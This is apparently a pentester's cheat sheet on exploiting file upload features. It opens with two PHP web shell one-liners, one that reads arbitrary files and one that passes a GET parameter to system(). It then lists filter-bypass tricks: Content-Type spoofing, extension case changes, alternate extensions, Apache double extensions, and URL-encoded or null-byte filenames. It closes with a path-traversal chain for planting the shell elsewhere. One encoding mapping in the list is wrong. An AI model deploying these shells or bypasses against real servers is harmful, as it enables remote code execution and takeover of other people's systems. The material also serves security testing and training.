- you can upload PHP files to get RCE (Remote Code Execution) or a Web Shell

```php
<?php echo file_get_contents('/dir/dir/file'); ?>
<?php echo system($_GET['command']); ?>

```


# Bypass filter
```python
- Upload php file then change the Content-Type to image/jpeg or image/png
- use different case - file.pHp
- use extensions such as php5, shtml
- In Apache, a php file might be executed using the double extension technique such as “file.php.jpg” when “.jpg” is allowed.
- use different encoding techniques (null byte, singe and double url encode):
	%2E = .
	%25, %32, %65 = %, 2, 3
	%00 = null byte

	- shell%2E.php
	- shell%25%32%65.php
	- shell.php%00.jpg
	- shell.phpl.jpg



```

# chain attack
```python
- if the application is not validated to restrict executable file upload but restricts the execution of it in specific directory but have a path traversal vulnerability on upload. Upload the executable file (php, etc.) to a different location. Remember to use different encoding techniques to bypass filter.
